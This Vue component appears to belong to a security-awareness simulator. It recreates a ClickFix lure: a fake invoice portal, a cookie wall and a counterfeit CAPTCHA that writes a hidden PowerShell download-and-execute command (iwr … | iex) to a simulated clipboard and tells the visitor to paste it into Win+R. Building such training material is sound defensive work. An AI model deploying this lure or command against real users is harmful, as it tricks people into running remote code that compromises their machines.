<template>
  <div class="cf-root">
    <!-- ===== stage: a normal-looking document portal with a cookie-consent gate ===== -->
    <template v-if="stage === 'landing'">
      <div class="cf-portal">
        <div class="cf-portal-top">
          <span class="cf-portal-brand">harborcrest-invoice-portal.com</span>
          <span class="cf-portal-crumb">Secure Document Portal</span>
        </div>

        <div class="cf-portal-card">
          <div class="cf-doc-icon" aria-hidden="true">
            <svg viewBox="0 0 24 24"><path fill="#d93025" d="M6 2h9l5 5v15H6z"/><path fill="#f3f5f7" d="M15 2l5 5h-5z"/><text x="12" y="16" text-anchor="middle" fill="#fff" font-size="6" font-weight="700">PDF</text></svg>
          </div>
          <div class="cf-doc-info">
            <div class="cf-doc-name">INV-2291.pdf</div>
            <div class="cf-doc-meta">Harbor Crest Marine Services · OMR 5,490.000 · 2.1 MB</div>
            <div class="cf-doc-blur" aria-hidden="true">
              <span></span><span></span><span></span><span></span>
            </div>
          </div>
          <div class="cf-doc-lock">🔒 Verification required to view this document</div>
        </div>

        <p class="cf-portal-foot">By continuing you agree to our terms of service and privacy policy.</p>
      </div>

      <!-- the cookie WALL: big, blocking, impossible to miss — clicking
           through is what wakes the CAPTCHA -->
      <div class="cf-cookie">
        <div class="cf-cookie-card">
          <div class="cf-cookie-icon" aria-hidden="true">🍪</div>
          <div class="cf-cookie-head">Before you continue to <b>docs.harborcrest-invoice-portal.com</b></div>
          <div class="cf-cookie-text">
            <span>We and our <b>237 partners</b> use cookies to keep this document portal working
            securely, remember your preferences and measure traffic.</span>
            <span class="cf-cookie-hint">Accept cookies to continue to your document <b>INV-2291.pdf</b></span>
          </div>
          <div class="cf-cookie-btns">
            <button class="cf-cookie-nec" @click="acceptCookies(false)">Necessary only</button>
            <button class="cf-cookie-acc" @click="acceptCookies(true)">Accept all cookies</button>
          </div>
          <div class="cf-cookie-links">Cookie settings &middot; Privacy policy &middot; Imprint</div>
        </div>
      </div>
    </template>

    <!-- ===== stage: the turnstile interstitial (after the cookie gate) ===== -->
    <div v-else class="cf-main">
      <!-- site identity -->
      <div class="cf-logo-row">
        <svg class="cf-logo-img" viewBox="0 0 24 24" aria-hidden="true">
          <path fill="#2563eb" d="M6 2h9l5 5v15H6z"/>
          <path fill="#dbeafe" d="M15 2l5 5h-5z"/>
          <path fill="#2563eb" d="M9 12h8v1.6H9zM9 15.5h8v1.6H9zM9 8.5h5v1.6H9z"/>
        </svg>
        <p class="cf-domain-title"><span>docs.harborcrest-invoice-portal.com</span></p>
      </div>

      <div class="cf-text">
        <p>
          <span v-if="stage === 'preloader'">Checking if you are human. This may take a few seconds.</span>
          <span v-else>Verify you are human by completing the action below.</span>
        </p>
      </div>

      <div class="cf-intro">
        <!-- initial loading spinner -->
        <div v-if="stage === 'preloader'" class="cf-preloader">
          <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
        </div>

        <!-- the turnstile-style widget (mimics the real ClickFix layout:
             300x74 box that expands to 530px with the verify panel inside) -->
        <div v-else class="cf-widget" :class="{ expanded: verifyOpen }">
          <div class="cf-widget-inner">
            <div class="cf-check-col">
              <!-- step0: rotating dots, "Verifying..." -->
              <svg v-if="stage === 'verifying'" class="cf-dots" viewBox="0 0 60 60" xmlns="http://www.w3.org/2000/svg">
                <circle cx="30" cy="10" r="2.5"/>
                <circle cx="50" cy="30" r="2.5"/>
                <circle cx="30" cy="50" r="2.5"/>
                <circle cx="10" cy="30" r="2.5"/>
                <circle cx="43.6" cy="16.4" r="2.5"/>
                <circle cx="16.4" cy="16.4" r="2.5"/>
                <circle cx="43.6" cy="43.6" r="2.5"/>
                <circle cx="16.4" cy="43.6" r="2.5"/>
              </svg>

              <!-- step1: the checkbox, "I'm not a robot" -->
              <button
                v-else-if="stage === 'ready'"
                type="button"
                class="cf-checkbox"
                aria-label="Verify you are human"
                @click="checkNow"
              ></button>

              <!-- step2: spinner, "Verification Steps" -->
              <div v-else-if="stage === 'steps'" class="lds-ring small"><div></div><div></div><div></div><div></div></div>

              <!-- step3: success tick, "Successfully." -->
              <svg v-else class="cf-tick" viewBox="0 0 50 50" xmlns="http://www.w3.org/2000/svg">
                <circle cx="25" cy="25" r="23"/>
                <path d="M15 25 L22 32 L35 18"/>
              </svg>
            </div>

            <div class="cf-tettx">
              <p v-if="stage === 'verifying'">Verifying...</p>
              <p v-else-if="stage === 'ready'">I'm not a robot</p>
              <p v-else-if="stage === 'steps'">Verification Steps</p>
              <p v-else>Successfully.</p>
            </div>

            <div class="cf-legal">
              <svg class="cf-legal-logo" viewBox="0 0 24 12" aria-hidden="true"><path fill="#f38020" d="M17.6 11.2H3.9c-1.6 0-3-1.3-3-3 0-1.5 1.2-2.8 2.6-3C4.1 2.9 6.3 1 8.9 1c2.1 0 4 1.2 4.8 3 .4-.1.8-.2 1.2-.2 2 0 3.7 1.6 3.7 3.7 0 2-1.6 3.7-3.6 3.7h-.4z"/></svg>
              <p>Confidentiality</p>
              <p>Terms and Conditions</p>
            </div>
          </div>

          <!-- THE ATTACK: instructions slide in INSIDE the widget, exactly
               like the real ClickFix kit. The checkbox click already
               hijacked the simulated OS clipboard. -->
          <div class="cf-verify" :class="{ active: verifyOpen }">
            <div class="cf-verify-main">
              <p class="cf-verify-title">To better prove you are not a robot, please:</p>
              <ol>
                <li>Press &amp; hold the Windows Key
                  <span class="cf-nobr"><svg class="cf-winkey" viewBox="0 0 88 88" aria-hidden="true"><path fill="#0078d4" d="M0 12.5 35.7 7.6v34.9L0 42.6zM39.9 7 87.9 0v42.3L39.9 42.7zM0 46.2 35.7 48.6V83L0 78.1zM39.9 48.3 87.9 48.6v41.3L39.9 83.6z"/></svg> + <b>R</b>.</span></li>
                <li>In the verification window, press <b>Ctrl</b> + <b>V</b>.</li>
                <li>Press <b>Enter</b> on your keyboard to finish.</li>
              </ol>
              <p class="cf-observe">
                You will observe and agree:<br>
                <code> ✅ "I am not a robot - reCAPTCHA Verification ID: <span>{{ verifyId }}</span>" </code>
              </p>
            </div>
            <div class="cf-verify-foot">
              <div class="cf-verify-left">Perform the steps above to finish verification.</div>
              <button type="button" class="cf-verify-btn" @click="clickedVerify">Verify</button>
            </div>
          </div>
        </div>
      </div>

      <p class="cf-domain-footer">
        <span>docs.harborcrest-invoice-portal.com</span> needs to review the security of your connection before proceeding.
      </p>
    </div>

    <div v-if="stage !== 'landing'" class="cf-footer">
      <div class="cf-footer-inner">
        <div>Ray ID: <code>{{ rayId }}</code></div>
        <div>Platform performance and security <span>Cloudflare</span></div>
      </div>
    </div>
  </div>
</template>

<script setup lang="ts">
const session = useSessionStore()

const COMMAND = 'powershell.exe -w hidden -ep bypass -c "iwr https://cdn.wadigate-support-cdn.com/uv.ps1 | iex"'

// stage machine mirrors the original ClickFix kit, gated behind a cookie banner:
// landing (cookie consent) → preloader → verifying (dots) → ready (checkbox) → steps (spinner + panel) → success → loop
const stage = ref<'landing' | 'preloader' | 'verifying' | 'ready' | 'steps' | 'success'>('landing')
const verifyOpen = ref(false)
const verifyId = ref(String(Math.floor(100000 + Math.random() * 900000)))

// THE TRICK: the clipboard command carries a reassuring comment that matches the
// "verification ID" shown on the page — everything after # never runs, it is
// pure social engineering to make the paste look legitimate
function hijackedCommand(): string {
  return `${COMMAND} # I am not a robot - reCAPTCHA Verification ID: ${verifyId.value}`
}
const rayId = ref(
  Array.from({ length: 16 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('')
)

onMounted(() => {
  session.timelineStep('Document portal demands cookie consent')
})

// the cookie gate: either choice "unlocks" the document — and wakes the CAPTCHA
function acceptCookies(all: boolean) {
  session.log('COOKIE_CHOICE', all ? 'accepted all cookies' : 'necessary only', 'neutral')
  stage.value = 'preloader'
  startFlow()
}

function startFlow() {
  session.timelineStep('Fake "document portal" serves CAPTCHA loop')
  setTimeout(() => (stage.value = 'verifying'), 1500)
  setTimeout(() => (stage.value = 'ready'), 3500)
}

function checkNow() {
  // THE ATTACK CORE: checkbox click silently replaces the OS clipboard —
  // command + a reassuring "# verification" comment that never executes
  session.clipboard = hijackedCommand()
  session.flag('captcha_clicked')
  session.log('CAPTCHA_PASSED', 'clipboard silently replaced with attacker command', 'risky')
  session.timelineStep('User completes fake verification')
  session.c2Start()
  session.c2Log('[page] "I am not a robot" clicked: command written to the visitor\u2019s clipboard', 'text-emerald-300', 'Almost nothing yet. A page wrote text to the clipboard. The evidence starts when it is pasted into Run.', 'Block Win+R for standard users')
  session.coach('Hmm. That "verification" just wrote something to your clipboard.')

  stage.value = 'steps'
  setTimeout(() => {
    verifyOpen.value = true
    session.timelineStep('Page instructs: Win+R / terminal command')
    // a browser can't receive the Windows key, so the simulator maps Win+R to Ctrl+R
    session.coach('Simulator note: this runs in a browser, so the Windows key is not available. Press Ctrl+R instead of Win+R (or use Start → Run…).')
  }, 500)
}

function clickedVerify() {
  // clicked WITHOUT actually running the steps — page pretends success and loops
  verifyOpen.value = false
  setTimeout(() => {
    stage.value = 'success'
    setTimeout(() => {
      stage.value = 'ready'
      session.coach('It reset. It will loop forever until you do what it asks — that is the pressure mechanism.')
    }, 1600)
  }, 600)
}
</script>

<style scoped>
.cf-root {
  font-family: Roboto, helvetica, arial, sans-serif;
  display: flex;
  flex-direction: column;
  min-height: 100%;
  background-color: #fcfcfc;
  color: #333;
  position: relative;
}

/* ---------- stage: document portal + cookie consent ---------- */
.cf-portal {
  flex: 1;
  display: flex;
  flex-direction: column;
  align-items: center;
  padding: 40px 20px 60px;
  font-family: 'Segoe UI', system-ui, Arial, sans-serif;
}
.cf-portal-top {
  width: 100%;
  max-width: 640px;
  display: flex;
  justify-content: space-between;
  align-items: baseline;
  padding: 0 8px 14px;
  border-bottom: 1px solid #e3e6ea;
}
.cf-portal-brand { font-size: 13px; color: #5f6368; }
.cf-portal-crumb { font-size: 13px; font-weight: 600; color: #202124; }

.cf-portal-card {
  width: 100%;
  max-width: 560px;
  margin-top: 48px;
  background: #fff;
  border: 1px solid #e3e6ea;
  border-radius: 12px;
  box-shadow: 0 10px 30px rgba(20, 24, 40, 0.08);
  padding: 26px 28px;
  display: flex;
  flex-direction: column;
  gap: 14px;
}
.cf-doc-icon { width: 44px; height: 44px; }
.cf-doc-name { font-size: 17px; font-weight: 700; color: #202124; }
.cf-doc-meta { font-size: 12.5px; color: #5f6368; margin-top: 2px; }
.cf-doc-blur {
  display: flex;
  flex-direction: column;
  gap: 8px;
  padding: 14px;
  background: #f6f8fb;
  border-radius: 8px;
  filter: blur(5px);
  user-select: none;
}
.cf-doc-blur span { height: 8px; background: #d8dde5; border-radius: 4px; }
.cf-doc-blur span:nth-child(1) { width: 92%; }
.cf-doc-blur span:nth-child(2) { width: 78%; }
.cf-doc-blur span:nth-child(3) { width: 85%; }
.cf-doc-blur span:nth-child(4) { width: 60%; }
.cf-doc-lock {
  font-size: 13px;
  color: #5f6368;
  background: #f6f8fb;
  border: 1px solid #e3e6ea;
  border-radius: 8px;
  padding: 10px 12px;
  text-align: center;
}
.cf-portal-foot {
  margin-top: 28px;
  font-size: 11px;
  color: #9aa0a6;
  text-align: center;
}

/* the cookie wall: dimmed page, card parked bottom-right —
   still blocking, but less theatrical than a centered modal */
.cf-cookie {
  position: absolute;
  inset: 0;
  z-index: 40;
  background: rgba(16, 20, 34, 0.3);
  backdrop-filter: blur(1px);
  display: flex;
  align-items: flex-end;
  justify-content: flex-end;
  /* lifted off the very bottom: Skippy (the booth assistant) floats fixed
     over the screen's bottom-right corner and would cover the buttons */
  padding: 18px 18px 215px;
}
.cf-cookie-card {
  width: 100%;
  max-width: 380px;
  background: #fff;
  border-radius: 12px;
  box-shadow: 0 14px 48px rgba(0, 0, 0, 0.35);
  padding: 20px 22px 16px;
  text-align: center;
  animation: cf-cookie-pop 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
}
@keyframes cf-cookie-pop {
  from { opacity: 0; transform: scale(0.9) translateY(14px); }
  to { opacity: 1; transform: scale(1) translateY(0); }
}
.cf-cookie-icon {
  font-size: 34px;
  line-height: 1;
  margin-bottom: 8px;
  animation: cf-cookie-wiggle 2.4s ease-in-out infinite;
}
@keyframes cf-cookie-wiggle {
  0%, 88%, 100% { transform: rotate(0deg); }
  92% { transform: rotate(-10deg); }
  96% { transform: rotate(8deg); }
}
.cf-cookie-head {
  font-size: 14px;
  font-weight: 700;
  color: #202124;
  margin-bottom: 8px;
}
.cf-cookie-text { display: flex; flex-direction: column; gap: 6px; margin-bottom: 16px; }
.cf-cookie-text span { font-size: 12px; color: #3c4043; line-height: 1.5; }
.cf-cookie-hint { font-size: 11.5px !important; color: #1a73e8 !important; font-weight: 600; }

.cf-cookie-btns {
  display: flex;
  gap: 8px;
  align-items: stretch;
  justify-content: center;
  flex-wrap: wrap;
}
.cf-cookie-nec {
  background: none;
  border: 1.5px solid #dadce0;
  color: #3c4043;
  border-radius: 8px;
  padding: 9px 14px;
  font-size: 12.5px;
  cursor: pointer;
  font-family: inherit;
  min-width: 130px;
}
.cf-cookie-nec:hover { background: #f6f8fb; }
.cf-cookie-acc {
  background: #1a73e8;
  border: none;
  color: #fff;
  border-radius: 8px;
  padding: 10px 20px;
  font-size: 13px;
  font-weight: 700;
  cursor: pointer;
  font-family: inherit;
  min-width: 160px;
  box-shadow: 0 4px 12px rgba(26, 115, 232, 0.4);
  animation: cf-cookie-pulse 1.8s ease infinite;
}
.cf-cookie-acc:hover { background: #1765cc; transform: translateY(-1px); }
.cf-cookie-acc:active { transform: translateY(0); }
@keyframes cf-cookie-pulse {
  0%, 100% { box-shadow: 0 4px 12px rgba(26, 115, 232, 0.4); }
  50% { box-shadow: 0 4px 22px rgba(26, 115, 232, 0.75); }
}
.cf-cookie-links {
  margin-top: 12px;
  font-size: 10px;
  color: #9aa0a6;
  letter-spacing: 0.04em;
}

.cf-main {
  margin: 5rem auto;
  max-width: 60rem;
  padding: 0 1.5rem;
  width: 100%;
  display: flex;
  flex-direction: column;
  align-items: center;
}

/* ---------- identity ---------- */
.cf-logo-row {
  display: flex;
  align-items: center;
  margin-bottom: 1rem;
}
.cf-logo-img { height: 2rem; margin-right: 0.5rem; }
.cf-domain-title {
  font-size: 2.2rem;
  font-weight: 500;
  color: #313131;
}

/* ---------- status text ---------- */
.cf-text {
  font-size: 1.4rem;
  line-height: 2.1rem;
  min-height: 2rem;
  font-weight: 500;
  margin-bottom: 1.75rem;
  text-align: center;
}
.cf-text p { margin: 0; }

.cf-intro {
  display: flex;
  justify-content: center;
  min-height: 74px;
}
.cf-preloader {
  display: flex;
  align-items: center;
  justify-content: center;
  padding: 1rem 0;
}

/* ---------- spinner (same geometry as the reference kit) ---------- */
.lds-ring {
  display: inline-block;
  position: relative;
  height: 1.875rem;
  width: 1.875rem;
}
.lds-ring.small { height: 1.75rem; width: 1.75rem; }
.lds-ring div {
  animation: cf-ring 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite;
  border: 0.28rem solid transparent;
  border-top-color: #313131;
  border-radius: 50%;
  display: block;
  position: absolute;
  height: 100%;
  width: 100%;
}
.lds-ring div:first-child { animation-delay: -0.45s; }
.lds-ring div:nth-child(2) { animation-delay: -0.3s; }
.lds-ring div:nth-child(3) { animation-delay: -0.15s; }
@keyframes cf-ring {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}

/* ---------- the widget: 300x74 box, expands to 530px with verify panel ---------- */
.cf-widget {
  display: flex;
  flex-direction: column;
  align-items: center;
  width: 300px;
  background-color: #fafafa;
  border: 1px solid #e0e0e0;
  border-radius: 4px;
  padding: 10px;
  overflow: hidden;
  transition: width 0.5s ease-in-out;
}
.cf-widget.expanded { width: 530px; }

.cf-widget-inner {
  display: flex;
  align-items: center;
  width: 100%;
  min-height: 54px;
}

.cf-check-col {
  width: 30px;
  height: 28px;
  margin-left: 3px;
  margin-right: 12px;
  position: relative;
  display: flex;
  align-items: center;
  justify-content: center;
  flex-shrink: 0;
}

.cf-dots {
  width: 40px;
  height: 40px;
  margin-top: -4px;
  animation: cf-rotate 4s linear infinite;
  fill: #16a34a;
}
@keyframes cf-rotate {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}

.cf-checkbox {
  width: 28px;
  height: 28px;
  background-color: #fff;
  border-radius: 2px;
  border: 2px solid #888;
  cursor: pointer;
  padding: 0;
  transition: border-color 0.3s, background-color 0.3s;
}
.cf-checkbox:hover { border-color: #4285f4; }

.cf-tick { width: 30px; height: 30px; }
.cf-tick circle { fill: #28a745; }
.cf-tick path {
  stroke: #fff;
  stroke-width: 4;
  fill: none;
  stroke-linecap: round;
  stroke-linejoin: round;
}

.cf-tettx { color: #4e4e4e; font-size: 14px; }
.cf-tettx p { margin: 0; }

.cf-legal {
  font-size: 8px;
  text-align: right;
  margin-left: auto;
  display: flex;
  flex-direction: column;
  align-items: flex-end;
  gap: 2px;
}
.cf-legal-logo { width: 67px; height: 23px; object-fit: contain; }
.cf-legal p { text-decoration: underline; color: #555; margin: 0; }

/* ---------- the embedded instruction panel (the actual attack) ---------- */
.cf-verify {
  display: none;
  width: 100%;
  border-top: 1px solid #797979;
  padding-top: 3px;
  margin-top: 15px;
}
.cf-verify.active { display: block; animation: cf-fade 0.5s; }
@keyframes cf-fade {
  from { opacity: 0; }
  to { opacity: 1; }
}

.cf-verify-main { padding: 16px; font-size: 14px; color: #333; }
.cf-verify-title { font-size: 18px; margin: 0 0 15px; }
.cf-verify-main ol { padding-left: 20px; margin: 0; }
.cf-verify-main ol li { margin-bottom: 10px; line-height: 1.5; }
.cf-nobr { white-space: nowrap; }
.cf-winkey {
  display: inline-block;
  height: 1em;
  width: 1em;
  vertical-align: -0.15em;
}
.cf-observe { padding-top: 10px; margin: 0; }
.cf-observe code {
  display: block;
  margin-top: 10px;
  background: none;
  border: 1px solid #797979;
  padding: 10px;
  font-size: 12px;
  color: #9a9a9a;
  white-space: nowrap;
  overflow-x: auto;
}

.cf-verify-foot {
  background: #f2f2f2;
  padding: 12px 16px;
  display: flex;
  align-items: center;
  justify-content: flex-end;
  gap: 12px;
}
.cf-verify-left {
  text-align: left;
  font-size: 14px;
  flex: 1;
  color: #444;
}
.cf-verify-btn {
  background: #5e5e5e;
  padding: 9px 38px;
  color: #fff;
  border: none;
  border-radius: 5px;
  cursor: pointer;
  font-size: 14px;
}
.cf-verify-btn:hover { background: #4a4a4a; }

/* ---------- page footers ---------- */
.cf-domain-footer {
  font-size: 1.3rem;
  line-height: 2rem;
  padding-top: 33px;
  text-align: center;
  color: #555;
}
.cf-domain-footer span { font-weight: 500; color: #313131; }

.cf-footer {
  margin-top: auto;
  font-size: 0.75rem;
  line-height: 1.125rem;
  width: 100%;
}
.cf-footer-inner {
  border-top: 1px solid #d9d9d9;
  padding: 1rem 1.5rem;
  text-align: center;
  color: #777;
}
.cf-footer-inner code { font-family: monospace; }
.cf-footer-inner > div:first-child { margin-bottom: 5px; }

/* ---------- overlay ---------- */
</style>
